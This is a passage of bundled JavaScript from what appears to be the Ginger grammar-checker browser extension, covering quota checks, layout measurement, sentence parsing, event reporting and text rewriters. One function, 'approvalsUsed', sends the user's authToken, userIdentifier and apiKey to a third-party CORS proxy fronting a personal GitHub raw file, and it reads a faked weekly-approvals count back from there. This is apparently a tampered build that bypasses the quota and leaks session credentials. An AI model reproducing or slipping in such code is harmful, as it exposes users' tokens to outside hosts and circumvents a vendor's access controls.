                        chrome.storage.sync.get("approvalsUsed", function(e) {
                            var t = e.approvalsUsed;
                            if (t && t.time && t.time > new Date().getTime() && typeof t.value == "number") {
                                r(t.value);
                            } else {
                                r(null);
                            }
                        });
                    } else {
                        r(null);
                    }
                } catch (e) {
                    console.error(e);
                    r(null);
                }
            });
        };
        var r = function(t) {
            var r = $gingerWidgetJquery.Deferred();
            var n = gingerModule.get("widget.session").get();
            if (n.license === 2) {
                a(-1);
                return r.promise();
            }
            if (!gingerModule.get("widget.session").isLoggedIn()) {
                r.reject();
            } else {
                e().then(function(e) {
                    if (e !== null) {
                        if (t) {
                            i = e;
                        } else {
                            o(e);
                        }
                        r.resolve(e);
                        return;
                    }
                    $gingerWidgetJquery.ajax({
                        url: "https://data.gingersoftware.com/clientdata/jsonSecured/GetApprovalCount",
                        data: {
                            apiKey: gingerModule.get("widget.config").get("apiKey"),
                            lang: gingerModule.get("widget.config").get("dialect"),
                            clientVersion: gingerModule.get("widget.config").get("clientVersion"),
                            userIdentifier: n.userId,
                            authToken: n.token
                        },
                        dataType: "json",
                        success: function(e) {
                            a(e.WeeklyApprovalsLeft, true);
                            if (t) {
                                i = e.WeeklyApprovalsLeft;
                            } else {
                                o(e.WeeklyApprovalsLeft);
                            }
                            r.resolve(e.WeeklyApprovalsLeft);
                        }
                    });
                    return r.promise();
                });
            }
        };
        var n = function(e) {
            if (e === null) return;
            if (i === -1) return;
            if (e >= 5 && i < 5 && i >= 1) {
                t.trigger("triggered.approaching");
            } else if (i < 1) {
                if (e > 0) {
                    t.trigger("triggered.exceeded");
                } else {
                    t.trigger("triggered.onbubble");
                }
            }
        };
        var g = function() {
            return gingerModule.get("widget.config").get("loggedOutApprovalsLeft") > 0;
        };
        var s = function(e) {
            if (!e) {
                o(i);
                return;
            }
            var t = gingerModule.get("widget.session").get();
            if (gingerModule.get("widget.session").isLoggedIn()) {
                $gingerWidgetJquery.ajax({
                    url: "https://corsproxy.io/?https://raw.githubusercontent.com/nekohacker591/test1/main/weekly?",
                    data: {
                        numberOfApprovals: e,
                        userIdentifier: t.userId,
                        authToken: t.token,
                        apiKey: gingerModule.get("widget.config").get("apiKey"),
                        lang: gingerModule.get("widget.config").get("dialect"),
                        clientVersion: gingerModule.get("widget.config").get("clientVersion")
                    },
                    dataType: "json",
                    success: function(e) {
                        a(e.WeeklyApprovalsLeft, true);
                        try {
                            o(e.WeeklyApprovalsLeft);
                        } catch (e) {
                            console.error(e);
                        }
                    }
                });
            } else {
                var r = gingerModule.get("widget.config").get("loggedOutApprovalsLeft");
                if (r > 0) gingerModule.get("widget.config").set("loggedOutApprovalsLeft", r - e);
            }
        };
        var c = function() {
            return i === 0;
        };
        var l = function() {
            gingerModule.get("widget.session").listen.on("change", function(e, t) {
                if (!gingerModule.get("widget.session").isLoggedIn()) {
                    i = 10;
                } else {
                    i = null;
                    r(true);
                }
            });
            if (gingerModule.get("widget.session").isLoggedIn()) {
                r(true);
            } else {
                i = 10;
            }
        };
        l();
        return {
            approvalsUsed: s,
            isCapacityLimited: c,
            hasLoggedOutApprovalsLeft: g,
            retrieveApprovalsLeft: r,
            listen: t
        };
    }, [ "widget.session", "widget.config" ]);
})();

var module = gingerModule.load("widget.measure", function() {
    var e = function(e, t) {
        var r = m(e, t);
        var n = r.width;
        var i = r.height;
        var o = r.top;
        var a = r.left;
        var g = getComputedStyle(e);
        var s = parseFloat(g["border-top-width"]) || 0;
        var c = parseFloat(g["border-right-width"]) || 0;
        var l = parseFloat(g["border-bottom-width"]) || 0;
        var u = parseFloat(g["border-left-width"]) || 0;
        var d = 0;
        var f = 0;
        if ("BackCompat" !== document.compatMode || e !== document.body || e !== document.scrollingElement) {
            var p = e.clientWidth / v(e);
            f = i - e.clientHeight / v(e) - s - l, (d = n - p - u - c) < 1 && (d = 0), f < 1 && (f = 0);
        }
        n -= u + d + c, i -= s + f + l, o += s, a += u;
        return {
            width: n,
            height: i,
            top: o,
            right: a + n,
            bottom: o + i,
            left: a,
            border: {
                top: s,
                right: c,
                bottom: l,
                left: u
            }
        };
    };
    var t = function(e) {
        var t = e === document.body && "BackCompat" === document.compatMode;
        var r = t ? 0 : e.scrollTop;
        var n = t ? 0 : e.scrollLeft;
        return {
            top: r,
            left: n
        };
    };
    var v = function(e) {
        var t = 1;
        var r = e.getBoundingClientRect().width;
        if (r > 0) {
            var n = e.offsetWidth;
            Math.abs(r - n) > 1 ? t = n / r : t = 1;
        } else t = 1;
        return t;
    };
    var o = function(e) {
        var t = e.getBoundingClientRect();
        return {
            width: t.width,
            height: t.height,
            top: t.top,
            right: t.right,
            bottom: t.bottom,
            left: t.left
        };
    };
    var m = function(e, t) {
        var r = o(e);
        var n = a();
        r.top += n.top;
        r.left += n.left;
        r.bottom += n.top;
        r.right += n.left;
        if (document.body && document.body.contains(e)) {
            var i = g(t);
            r.top -= i.top;
            r.right -= i.left;
            r.bottom -= i.top;
            r.left -= i.left;
        }
        return {
            width: r.width,
            height: r.height,
            top: r.top,
            right: r.right,
            bottom: r.bottom,
            left: r.left
        };
    };
    var a = function() {
        var e = document.documentElement && document.documentElement.scrollTop || document.body && document.body.scrollTop || 0, t = document.documentElement && document.documentElement.scrollLeft || document.body && document.body.scrollLeft || 0;
        return {
            top: e,
            left: t
        };
    };
    var u = function(e) {
        return [ "relative", "fixed", "absolute", "sticky" ].indexOf(e) > -1;
    };
    var g = function(e) {
        var t = {
            top: 0,
            left: 0
        };
        if (document.body && u(e)) {
            var r = document.documentElement.getBoundingClientRect();
            var n = document.body.getBoundingClientRect();
            var i = document.documentElement.offsetTop;
            var o = document.documentElement.offsetLeft;
            var a = n.top - r.top + i;
            var g = n.left - r.left + o;
            var s = window.getComputedStyle(document.body);
            var c = parseFloat(s["border-top-width"]) || 0;
            var l = parseFloat(s["border-left-width"]) || 0;
            t = {
                top: a + c,
                left: g + l
            };
        }
        return t;
    };
    var r = function(e) {
        var t = e === window.document.body && "BackCompat" === window.document.compatMode;
        var r = t ? 0 : e.scrollTop;
        var n = t ? 0 : e.scrollLeft;
        return {
            top: r,
            left: n
        };
    };
    var n = function(r) {
        var n = 1;
        document.querySelectorAll("body *").forEach(function(e) {
            if ($gingerWidgetJquery(e).css("position") !== "static" && (!r ? !/ginger-/.test(e.className) : true)) {
                var t = parseInt($gingerWidgetJquery(e).css("z-index"));
                t = isNaN(t) ? 1 : t;
                n = Math.max(t, n);
            }
        });
        return n;
    };
    return {
        getPaddingBox: e,
        getScrollPosition: r,
        getElementScroll: t,
        getDocumentScroll: a,
        getDocumentGap: g,
        getScaleRatio: v,
        findHighestZIndex: n
    };
}, [ "widget.session", "widget.config" ]);

(function() {
    var e = gingerModule.load("widget.mutationDetectorService", function(i) {
        var o = function(e) {
            if (e.tagName === "IFRAME") {
                e = e.contentWindow.document.body;
                var t = false;
                var r = e.ownerDocument.defaultView.getMatchedCSSRules(e, "");
                if (r && $gingerWidgetJquery.isArray(r)) {
                    for (var n = 0; n < r.length; n++) {
                        if (r[n].style.height) {
                            t = true;
                        }
                    }
                }
                if (t) return {
                    vertical: e.clientHeight + i.scrollbarWidth < e.scrollHeight,
                    horizontal: e.clientWidth < e.scrollWidth
                }; else return {
                    vertical: e.clientHeight + i.scrollbarWidth > e.scrollHeight,
                    horizontal: e.clientWidth < e.scrollWidth
                };
            } else {
                return {
                    vertical: e.clientHeight < e.scrollHeight,
                    horizontal: e.clientWidth < e.scrollWidth
                };
            }
        };
        var e = function(e) {
            var t = {
                height: 0,
                width: 0,
                top: 0,
                left: 0,
                node: e
            }, r = $gingerWidgetJquery(e);
            var n = r.hasClass("LW-avf");
            if (n) {
                try {
                    t.node = r.closest("table").closest("td").get(0);
                    var i = $gingerWidgetJquery(e.firstElementChild || e.firstChild);
                    if (i.length > 0) {
                        var o = getComputedStyle(i.get(0));
                        if (o) t.direction = o.direction;
                    }
                } catch (e) {}
            }
            return t;
        };
        var t = function(e) {
            if (!e) return;
            var t = {
                height: 0,
                width: 0,
                top: 0,
                left: 0,
                node: e
            };
            var r = $gingerWidgetJquery(t.node).offset();
            var n = o(t.node);
            return {
                height: $gingerWidgetJquery(t.node).outerHeight() + t.height,
                width: $gingerWidgetJquery(t.node).outerWidth() + t.width,
                direction: t.direction || $gingerWidgetJquery(t.node).css("direction"),
                top: (r ? r.top : 0) + t.top,
                left: (r ? r.left : 0) + t.left,
                hasVerticalScrollbar: n.vertical || $gingerWidgetJquery(t.node).css("overflow") == "scroll" || $gingerWidgetJquery(t.node).css("overflow-y") == "scroll" ? true : false,
                scrollTop: $gingerWidgetJquery(t.node).scrollTop(),
                scrollLeft: $gingerWidgetJquery(t.node).scrollLeft(),
                hasHorizontalScrollbar: n.horizontal || $gingerWidgetJquery(t.node).css("overflow") == "scroll" || $gingerWidgetJquery(t.node).css("overflow-x") == "scroll" ? true : false,
                isVisible: $gingerWidgetJquery(e).is(":visible"),
                fontSize: $gingerWidgetJquery(t.node).css("font-size")
            };
        };
        var r = function(e, t) {
            if (!t) {
                return true;
            }
            for (var r in e) {
                if (e[r] !== t[r]) {
                    return true;
                }
            }
            return false;
        };
        return {
            compareLayouts: r,
            getLayout: t
        };
    }, []);
})();

(function() {
    var e = gingerModule.load("widget.onlinestatus", function() {
        var t = $gingerWidgetJquery({});
        var r = true;
        var e = function() {
            window.addEventListener("online", function(e) {
                if (!r) {
                    t.trigger("online");
                }
                r = true;
            });
            window.addEventListener("offline", function(e) {
                if (r) {
                    t.trigger("offline");
                }
                r = false;
            });
            r = !!window.navigator.onLine;
        };
        var n = function() {
            return r;
        };
        e();
        return {
            listen: t,
            isOnline: n
        };
    }, [ "widget.report" ]);
})();

(function() {
    var e = gingerModule.load("widget.phraseService", function() {
        var p = /[\x1F]*[\s]*(([^.^!^?^\n^\x1F]|[.!?]+(?=\S)|(?=\x1F))+)([.!?\x1F]+(\n*(?=$))?|.*(?=[\n])|$|(?=\x1F))/gi;
        var v = /[^\x1F]+/g;
        var m = /\x1F/g;
        var h = /\x1C/g;
        var i = function(e) {
            if (!e) return [];
            var t = gingerModule.get("widget.utils").trimAndMatch(e);
            var r = t.text.match(p);
            if (!r) return [];
            r[0] = t.pre + r[0];
            r[r.length - 1] = r[r.length - 1] + t.post;
            var n = [];
            var i = 0;
            for (var o = 0; o < r.length; o++) {
                var a = r[o].match(/^[\x1F]+/);
                var g = r[o].match(/[\x1F]+$/);
                var s = a ? a.toString().replace(v, "").length : 0;
                var c = g ? g.toString().replace(v, "").length : 0;
                r[o] = r[o].replace(m, "");
                var l = i;
                var u = l + r[o].length;
                var d = false;
                if (h.test(r[o])) {
                    r[o] = r[o].replace(h, "");
                    d = true;
                }
                var f = {
                    text: r[o],
                    startsAt: l,
                    endsAt: u,
                    activeSentence: false,
                    id: gingerModule.get("widget.utils").generateUID(),
                    preLineBreakCount: s,
                    postLineBreakCount: c
                };
                if (d) f.ignored = true;
                f.words = w(f);
                n.push(f);
                i += r[o].length;
            }
            return n;
        };
        var o = function(e, t) {
            if (document.activeElement !== e) {
                return null;
            }
            if (!t) t = i($gingerWidgetJquery(e).val());
            try {
                var r = gingerModule.get("widget.caret").get(e);
            } catch (e) {
                return null;
            }
            for (var n = 0; n < t.length; n++) {
                if (t[n].startsAt <= r && t[n].endsAt >= r) {
                    return n;
                }
            }
            return null;
        };
        var e = function(e, t, r) {
            var n = [];
            if (!t) t = 0;
            if (typeof r === "undefined") r = e.text.length;
            var i = e.correction.Corrections;
            var o = 0;
            for (var a = 0; a < i.length; a++) {
                if (t <= i[a].From && r >= i[a].To) {
                    var g = t >= o ? t : o;
                    var s = t >= o ? t : o;
                    var c = e.text.substring(g, i[a].From);
                    var l = e.text.substring(i[a].From, i[a].To + 1);
                    n.push({
                        text: c
                    });
                    n.push({
                        text: l,
                        correction: i[a]
                    });
                }
                o = i[a].To + 1;
            }
            if (i[i.length - 1].To + 1 <= r) {
                var u = e.text.substring(i[i.length - 1].To + 1, r + 1);
                n.push({
                    text: u
                });
            }
            return n;
        };
        var w = function(e) {
            if (e.text.match(/^\s+$/)) return [];
            var t = e.text.match(/(^\s+)?\S+(\s*[.?!])?(\s+|$)/g);
            if (!t) return [];
            var r = [];
            for (var n = 0; n < t.length; n++) {
                var i = n == 0 ? e.startsAt : e.startsAt + t.slice(0, n).join("").length;
                var o = i + t[n].length;
                var a = {
                    text: t[n],
                    startsAt: i,
                    endsAt: o
                };
                r.push(a);
            }
            return r;
        };
        var a = function(e) {
            var t = gingerModule.get("widget.config").get("charLimit");
            if (t && t > 0 && e && e.length && e[e.length - 1].endsAt > t) {
                for (var r = 0; r < e.length; r++) {
                    if (e[r].endsAt > t) {
                        e[r].charLimited = true;
                    } else {
                        e[r].charLimited = false;
                    }
                }
            }
        };
        var t = function(e) {
            var t = gingerModule.get("widget.contentManager").getVal(e);
            var r = i(t);
            var n = o(e, r);
            a(r);
            if (n !== null) r[n].activeSentence = true;
            return r;
        };
        return {
            getSentences: i,
            getActiveSentence: o,
            getRepresentation: t,
            getSentenceFragments: e,
            getWordsOfSentence: w
        };
    }, [ "widget.contentManager", "widget.caret", "widget.utils" ]);
})();

(function() {
    var e = gingerModule.load("widget.preFlightProbe", function() {
        var t = false;
        var i = function(e) {
            var t = $gingerWidgetJquery.Deferred();
            var r = $gingerWidgetJquery(e).closest("[data-reactroot], [data-reactid]");
            if (r.length) {
                t.reject("reactRTETest failed");
            } else {
                t.resolve();
            }
            return t.promise();
        };
        var o = function(t) {
            var r = $gingerWidgetJquery.Deferred();
            var e = $gingerWidgetJquery(t).contents().filter(function() {
                return this.nodeType == Node.TEXT_NODE;
            });
            var n = t;
            if (e.length) {
                n = e[0].parentNode;
            } else if ($gingerWidgetJquery(t).find("p").length) {
                n = $gingerWidgetJquery(t).find("p").eq(0);
            } else if ($gingerWidgetJquery(t).find("br").length) {
                n = $gingerWidgetJquery(t).find("br").eq(0).parent();
            }
            $gingerWidgetJquery("<gwmw style='display:none;'></gwmw>").appendTo(n);
            var i = document.createEvent("CustomEvent");
            i.initCustomEvent("input", true, true, null);
            t.dispatchEvent(i);
            setTimeout(function() {
                var e = $gingerWidgetJquery(t).find("gwmw");
                if (e.length) {
                    r.resolve();
                } else {
                    r.reject("injectionTest failed");
                }
                e.remove();
            }, 50);
            return r.promise();
        };
        var e = function(t) {
            var e = gingerModule.get("widget.siteSettings").get(window.location.href, t);
            var r = $gingerWidgetJquery(t).attr("contenteditable");
            if (t && t.hasAttribute("contenteditable")) {
                return o(t).then(function() {
                    return i(t);
                }).catch(function(e) {
                    gingerModule.get("widget.report").report({
                        type: "ChromeExtPreFlightTestFail",
                        reason: e,
                        pageDomain: window.location.hostname,
                        areaFootprint: $gingerWidgetJquery(t).clone().html("").prop("outerHTML"),
                        application: "Chrome"
                    });
                    throw e;
                });
            } else {
                var n = $gingerWidgetJquery.Deferred();
                n.resolve();
                return n.promise();
            }
        };
        return {
            run: e,
            disable: function(e) {
                t = e;
            }
        };
    }, [ "widget.utils", "widget.report" ]);
})();

(function() {
    var e = gingerModule.load("widget.report", function() {
        var n = $gingerWidgetJquery({});
        var i = function() {
            return {
                widgetUid: gingerModule.get("widget.config").get("widgetUid"),
                type: "",
                ClientVersion: gingerModule.get("widget.config").get("version"),
                GingerUserName: "",
                affId: 1001,
                application: gingerModule.get("widget.config").get("platform")
            };
        };
        var o = {};
        var a = function(e) {
            var t = $gingerWidgetJquery.extend(i(), e);
            var r = {
                url: "https://tr.gingersoftware.com/trackingEP.php",
                method: "GET",
                timeout: 2e3,
                data: {
                    cmd: "reportEvents",
                    events: JSON.stringify([ {
                        payload: t,
                        source: gingerModule.get("widget.config").get("source")
                    } ])
                },
                cache: false,
                dataType: "text",
                contentType: "application/json",
                success: function(e) {
                    n.trigger("report.done", e);
                },
                error: function(e) {
                    n.trigger("report.fail", e);
                }
            };
            $gingerWidgetJquery.ajax(r);
            n.trigger("report.sent", r);
        };
        var e = function(e, t) {
            if (e.correction.Corrections && e.correction.Corrections.length) {
                for (var r = 0; r < e.correction.Corrections.length; r++) {
                    var n = e.correction.Corrections[r];
                    if (n.id === t) {
                        return n;
                    }
                }
            }
            return {};
        };
        var g = [ "", "Spelling", "Misused", "Grammar", "Synonym" ];
        var s = function(e) {
            var t = [];
            if (!e || !e.correction || !e.correction.Corrections) {
                return {};
            }
            for (var r = 0; r < e.correction.Corrections.length; r++) {
                var n = e.correction.Corrections[r];
                var i = n.Suggestions.length ? n.Suggestions[0] : null;
                t.push({
                    original: e.text.substring(n.From, n.To + 1),
                    suggestion: i ? i.Text : null,
                    confidenceLevel: n ? n.Confidence : null,
                    correctionType: g[n.Type],
                    learningCategory: n.TopLrnCatId
                });
            }
            return {
                sentence: e.text,
                corrections: e.correction.Corrections.length,
                correctionsDetails: t
            };
        };
        var c = function(e, t) {
            return {
                correctionType: g[t.Type],
                learningCategory: t.TopLrnCatId,
                token: e.text.substring(t.From, t.To + 1),
                suggestion: t.Suggestions.length ? t.Suggestions[0].Text : null,
                sentence: e.text
            };
        };
        var t = function(e) {
            a = e;
            gingerModule.get("widget.report").report = a;
        };
        var r = function() {
            gingerModule.get("widget.correctionBubble").listen.on("show", function(e, t) {
                var r = s(t.sentence);
                r.type = "bubbleOpen";
                r.pageUrl = window.location.href;
                a(r);
                if (!o[t.sentence.id]) {
                    o[t.sentence.id] = true;
                    r.type = "bubbleOpenUnique";
                    a(r);
                }
            });
            gingerModule.get("widget.correctionBubble").listen.on("hide", function(e, t) {
                var r = s(t.sentence);
                r.type = "bubbleClose";
                r.pageUrl = window.location.href;
                a(r);
            });
            gingerModule.get("widget.correctionBubble").listen.on("ignore.all", function(e, t) {
                var r = c(t.sentence, t.correction);
                r.type = "IgnoreCorrectionEvent";
                a(r);
            });
            gingerModule.get("widget.correctionBubble").listen.on("approve.all", function(e, t) {
                var r = s(t.sentence);
                r.type = "approveFragment";
                a(r);
            });
            gingerModule.get("widget.correctionBubble").listen.on("approved.mistake", function(e, t) {
                var r = c(t.sentence, t.correction);
                r.type = "ApproveSingleTokenInBubble";
                a(r);
            });
            gingerModule.get("widget.correctionBubble").listen.on("ignored.mistake", function(e, t) {
                var r = c(t.sentence, t.correction);
                r.type = "IgnoreSingleCorrection";
                a(r);
            });
            gingerModule.get("widget.api").listen.on("grammarcheck.sent", function() {
                a({
                    type: "GingerTheTextRTEvent"
                });
            });
            gingerModule.get("widget.api").listen.on("dictionary.added", function(e, t) {
                a({
                    word: t,
                    modification: "WordAddition",
                    type: "PersonalDictionaryModification"
                });
            });
        };
        r();
        return {
            listen: n,
            report: a,
            setReporter: t
        };
    }, [ "widget.correctionBubble", "widget.config", "widget.correctionService" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.common", function() {
        var n = 10;
        var i = null;
        var o = [];
        var a = function(e) {
            if (e) o.push(e);
            var t = !!i;
            if (t) {
                return;
            }
            var r = o.shift();
            r();
            if (o.length) {
                i = setTimeout(a, n);
            } else {
                i = null;
            }
            return r;
        };
        var e = function(e, t, r) {
            var n = $gingerWidgetJquery(t).closest(e);
            if ($gingerWidgetJquery(n).find(r)) {
                return n;
            } else {
                return null;
            }
        };
        var p = function(e) {
            var t, r = [], n = document.createTreeWalker(e, NodeFilter.SHOW_TEXT, null, false);
            while (t = n.nextNode()) {
                r.push(t);
            }
            return r;
        };
        var t = function(e) {
            var t = document;
            var r = e;
            var n, i;
            if (t.body.createTextRange) {
                n = document.body.createTextRange();
                n.moveToElementText(r);
                n.select();
            } else if (window.getSelection) {
                i = window.getSelection();
                n = document.createRange();
                n.selectNodeContents(r);
                i.removeAllRanges();
                i.addRange(n);
            }
            return n;
        };
        var r = function(e, t, r, n, i, o) {
            $gingerWidgetJquery(e).focus();
            var a = p(e);
            if (!a.length) {
                var g;
                g = e.appendChild(document.createTextNode(""));
                o(e, g, t);
                return;
            }
            var s = gingerModule.get("widget.utils").getNodeOffsetOfIndex(e, r, n);
            var c = false;
            for (var l = 0; l < a.length; l++) {
                var u = a[l].nodeValue;
                var d = a[l] == s.startNode;
                var f = a[l] == s.endNode;
                if (d) {
                    c = true;
                }
                if (c) {
                    if (d && f) {
                        o(e, a[l], u.substring(0, s.startNodeOffset) + t + u.substring(s.endNodeOffset));
                    } else if (d) {
                        o(e, a[l], u.substring(0, s.startNodeOffset) + t);
                    } else if (f) {
                        o(e, a[l], u.substring(s.endNodeOffset));
                    } else {
                        o(e, a[l], "");
                    }
                }
                if (f) {
                    break;
                }
            }
            return;
        };
        return {
            executeInQueue: a,
            selectText: t,
            contentEditableReplacer: r
        };
    });
})();

(function() {
    var e = gingerModule.load("widget.rewriters.contentEditable", function() {
        var e = function(e, t, r, n) {
            var i = "p,h1, h2, h3, h4, h5, h6,li,pre,address,blockquote,dl,div";
            if (document.activeElement !== e) e.focus();
            gingerModule.get("widget.selectionManager").saveSelection(e);
            var o = function(e, t, r) {
                $gingerWidgetJquery(t).replaceWith(r);
            };
            var a = gingerModule.get("widget.rewriters.common").contentEditableReplacer(e, t, r, n, i, o);
            gingerModule.get("widget.selectionManager").restoreSelection(e);
        };
        return {
            rewrite: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.draft.ce", function() {
        return gingerModule.get("widget.rewriters.facebook.ce");
    }, [ "widget.rewriters.common", "widget.rewriters.facebook.ce" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.draft.textarea", function() {
        var e = function(e, t, r, n) {
            var i = $gingerWidgetJquery(e);
            i.get(0).select();
            var o = i.val().length;
            var a = i.val().substring(r, n);
            var g = i.val().substring(0, r) + t + i.val().substring(n, o);
            i.val(g);
            gingerModule.get("widget.rewriters.common").executeInQueue(function() {
                var e = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                    detail: {
                        prop: "value",
                        value: g
                    }
                });
                document.dispatchEvent(e);
            });
            gingerModule.get("widget.rewriters.common").executeInQueue(function() {
                var e = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                    detail: {
                        event: "onChange",
                        params: {
                            target: {
                                value: g
                            }
                        }
                    }
                });
                document.dispatchEvent(e);
            });
        };
        return {
            rewrite: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.facebook.ce", function() {
        var e = {};
        var t = function(e, t, r, n) {
            var i = "[data-block='true']";
            var o = function(e, t, r) {
                var n = document.activeElement;
                gingerModule.get("widget.rewriters.common").executeInQueue(function() {
                    var e = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                        detail: {
                            event: "onFocus"
                        }
                    });
                    document.dispatchEvent(e);
                    var e = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                        detail: {
                            event: "onSelect"
                        }
                    });
                    gingerModule.get("widget.rewriters.common").selectText(t);
                    document.dispatchEvent(e);
                });
                gingerModule.get("widget.rewriters.common").executeInQueue(function() {
                    if (!r) {
                        var e = new CustomEvent("gingerModule-eventEmitter-onkeydown", {
                            detail: {
                                keyCode: 8,
                                which: 8,
                                charCode: 0,
                                type: "keydown"
                            }
                        });
                        document.dispatchEvent(e);
                    } else {
                        var t = new CustomEvent("gingerModule-eventEmitter-onpaste", {
                            detail: r
                        });
                        document.dispatchEvent(t);
                    }
                });
            };
            gingerModule.get("widget.rewriters.common").contentEditableReplacer(e, t, r, n, i, o);
        };
        return {
            rewrite: t
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.newReact.ce", function() {
        var f = function(e, t) {
            var r = 0;
            try {
                if (!t || !e) return 0;
                var n = t;
                for (var i = 0; i < e.length; i++) {
                    if (/\n/.test(e[i]) && i <= n) {
                        n = n + 1;
                    }
                }
                return n;
            } catch (e) {
                return r;
            }
        };
        var e = function(e, t, r, n, i) {
            var o = !!e.value;
            var a = e.value ? e.value : e.innerText;
            var g = e.querySelectorAll('[data-block="true"]');
            var s = 0;
            if (g && g.length) {
                a = "";
                for (var c = 0; c < g.length; c++) {
                    if (a.length < r) {
                        var l = g[c].innerText.match(/\n/g);
                        if (l && l.length) {
                            s += l.length - 1;
                        }
                    }
                    if (c !== 0) {
                        a += "\n";
                    }
                    a += g[c].textContent;
                }
                if (i) {
                    r = r - s;
                    n = n - s;
                } else {
                    var u = r;
                    r = f(a, r);
                    n = r + (n - u);
                }
            }
            t = a.slice(0, r) + t + a.slice(n);
            var d = function(t, r) {
                gingerModule.get("widget.rewriters.common").executeInQueue(function() {
                    var e = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                        detail: {
                            event: "onFocus"
                        }
                    });
                    document.dispatchEvent(e);
                    var e = new CustomEvent("gingerModule-eventEmitter-react-fire", {
                        detail: {
                            event: "onSelect"
                        }
                    });
                    gingerModule.get("widget.rewriters.common").selectText(t);
                    document.dispatchEvent(e);
                });
                gingerModule.get("widget.rewriters.common").executeInQueue(function() {
                    if (!r) {
                        var e = new CustomEvent("gingerModule-eventEmitter-onkeydown", {
                            detail: {
                                keyCode: 8,
                                which: 8,
                                charCode: 0,
                                type: "keydown"
                            }
                        });
                        document.dispatchEvent(e);
                    } else {
                        var t = new CustomEvent("gingerModule-eventEmitter-onpaste", {
                            detail: r
                        });
                        document.dispatchEvent(t);
                    }
                });
            };
            $gingerWidgetJquery(e).focus();
            d(e, t);
            return new Promise(function(e, t) {
                e(true);
            });
        };
        return {
            rewrite: e
        };
    }, [ "widget.rewriters.common" ]);
})();

(function() {
    var e = gingerModule.load("widget.rewriters.newFloating", function() {
        var e = {};
        var r = 20;
        var c = [];
        var t = null;
        var n = function() {
            if (!c.length) {
                return;
            }
            if (t) {
                return;
            }
            var e = c.shift();
            e.action();
            t = setTimeout(function() {
                t = null;
                n();
            }, e.timeout);
        };
        var l = function(e, t) {
            if (!t) t = r;
            c.push({
                action: e,
                timeout: t
            });
            n();
        };
        function i(e) {
            var t, r = [], n = document.createTreeWalker(e, NodeFilter.SHOW_TEXT, null, false);
            while (t = n.nextNode()) r.push(t);
            return r;
        }
        var u = function(e, n, t, r) {
            var i = gingerModule.get("widget.utils").getNodeFragmentsOfIndex(e, t, r);
            i.forEach(function(e) {
                if (!e.node.nodeValue) e.node.nodeValue = "";
                var t = e.node.nodeValue;
                var r = Math.min(t.length, n.length);
                e.newtext = t.substr(0, e.from) + n.substr(0, r) + t.substr(e.to);
                e.replacement = n.substr(0, e.to - e.from);
                n = n.substr(e.to - e.from);
            });
            if (n && i[i.length - 1]) i[i.length - 1].replacement += n;
            return i;
        };
        var d = function(e) {
            try {
                if (!e || document.querySelector("#ginger-rewriter-selection")) {
                    return;
                }
                var t = "[ginger-rewriter-selection]::selection {background: transparent!important} [ginger-rewriter-selection] *::selection {background: transparent!important}";
                var r = document.createElement("style");
                r.id = "ginger-rewriter-selection";
                r.type = "text/css";
                r.textContent = t;
                document.getElementsByTagName("head")[0].appendChild(r);
            } catch (e) {
                console.error("appendStylesForSelection Error: ", e);
            }
        };
        var f = function(n, r, i, o) {
            d(n);
            try {
                $gingerWidgetJquery(n).attr("ginger-rewriter-selection", true);
            } catch (e) {
                console.error(e);
            }
            var e = $gingerWidgetJquery.Deferred();
            var t = r;
            var a = !(v(n) || w(n) || y(n) || m(n));
            if (a) {
                l(function() {
                    x(n);
                });
            }
            var g = u(n, r, i, o);
            var s = 0;
            g.reverse();
            g.forEach(function(t, e) {
                if (!t) return;
                if (t.node.nodeValue === t.replacement) return;
                if (a) {
                    l(function() {
                        try {
                            x(t.node.parentNode);
                        } catch (e) {
                            c.length = 0;
                            return f(n, r, i, o + s);
                        }
                    });
                }
                l(function() {
                    p(t.node, t.from, t.to);
                });
                l(function() {
                    var e = new window.InputEvent("beforeinput", {
                        bubbles: !0,
                        cancelable: !1,
                        inputType: "insertText",
                        data: t.replacement
                    });
                    n.dispatchEvent(e);
                    s += t.replacement.length - (t.to - t.from);
                    try {
                        document.execCommand("insertText", !1, t.replacement);
                    } catch (e) {
                        console.error(e);
                    }
                });
            });
            if (g[0]) {
                l(function() {
                    var e = window.getSelection();
                    e.removeAllRanges();
                    if (n.contains(g[0].node)) {
                        var t = new Range();
                        var r = Math.min(g[0].from + g[0].replacement.length, g[0].node.nodeValue.length);
                        t.setStart(g[0].node, r);
                        t.collapse();
                        e.addRange(t);
                    }
                });
            }
            l(function() {
                $(n);
            });
            l(function() {
                try {
                    $gingerWidgetJquery(n).removeAttr("ginger-rewriter-selection");
                } catch (e) {
                    console.error(e);
                }
                e.resolve();
            });
            return e.promise();
        };
        function o(e) {
            var t, r;
            if (window.getSelection) {
                t = window.getSelection();
                if (t.rangeCount) {
                    r = t.getRangeAt(0);
                    r.deleteContents();
                    r.insertNode(document.createTextNode(e));
                }
            } else if (document.selection && document.selection.createRange) {
                r = document.selection.createRange();
                r.text = e;
            }
        }
        function p(e, t, r) {
            t = Math.max(t, 0);
            r = Math.min(r, e.nodeValue.length);
            var n = window.getSelection();
            n.empty();
            var i = new Range();
            i.setStart(e, t), i.setEnd(e, r), n.addRange(i);
        }
        function a(e) {
            return g(e) || s(e);
        }
        function g(e) {
            return e instanceof HTMLTextAreaElement;
        }
        function s(e) {
            return e instanceof HTMLInputElement && ("text" === e.type || "search" === e.type);
        }
        function v(e) {
            return e.classList.contains("mce-content-body") || e.classList.contains("mceContentBody");
        }
        function m(e) {
            return e.hasAttribute("data-slate-editor");
        }
        function h(e) {
            return e.classList.contains("ProseMirror");
        }
        function w(e) {
            return e.classList.contains("editor-rich-text__editable") || e.classList.contains("block-editor-rich-text__editable");
        }
        function y(e) {
            return "trix-editor" === e.nodeName.toLowerCase();
        }
        function b(e) {
            var t = e.getAttribute("contenteditable");
            return t && $gingerWidgetJquery(e).find("[data-block='true']").length > 0 || t && $gingerWidgetJquery(e).closest("[data-reactroot]").length;
        }
